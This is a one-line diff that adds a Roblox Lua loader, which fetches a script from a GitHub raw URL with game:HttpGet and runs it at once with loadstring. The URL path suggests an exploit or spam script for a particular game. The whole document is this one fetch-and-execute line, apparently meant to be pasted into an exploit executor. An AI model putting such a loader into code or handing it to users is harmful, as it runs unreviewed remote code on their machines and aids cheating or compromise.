@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/the-eternal-abyss-spam2-55i6tyydgp649j.lua"))()
